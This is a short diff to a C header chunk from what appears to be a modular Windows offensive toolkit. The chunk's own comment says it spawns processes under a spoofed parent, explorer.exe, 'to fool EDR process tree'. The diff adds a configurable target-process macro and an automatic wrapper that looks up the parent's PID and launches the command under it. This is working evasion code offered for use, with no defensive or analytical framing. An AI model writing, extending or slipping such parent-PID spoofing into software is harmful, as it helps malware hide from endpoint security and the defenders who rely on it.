@@ -1,11 +1,15 @@
 // chunk: process/ppid_spoof
 // depends: (none)
-// provides: spoof_ppid_create_process
+// provides: spoof_ppid_create_process, ppid_spoof_auto
 // headers: windows.h,tlhelp32.h
 // note: Create child process with spoofed parent (explorer.exe) to fool EDR process tree
 
 #ifndef CHUNK_PPID_SPOOF
 #define CHUNK_PPID_SPOOF
+
+#ifndef PPID_TARGET
+#define PPID_TARGET "explorer.exe"
+#endif
 
 #include <windows.h>
 #include <tlhelp32.h>
@@ -61,6 +65,12 @@ static BOOL spoof_ppid_create_process(const char *cmd, DWORD ppid, PROCESS_INFOR
     free(attr);
     CloseHandle(hParent);
     return ok;
+}
+
+static BOOL ppid_spoof_auto(const char *cmd, PROCESS_INFORMATION *pi_out) {
+    DWORD ppid = find_pid_by_name(PPID_TARGET);
+    if (!ppid) return FALSE;
+    return spoof_ppid_create_process(cmd, ppid, pi_out);
 }
 
 #endif
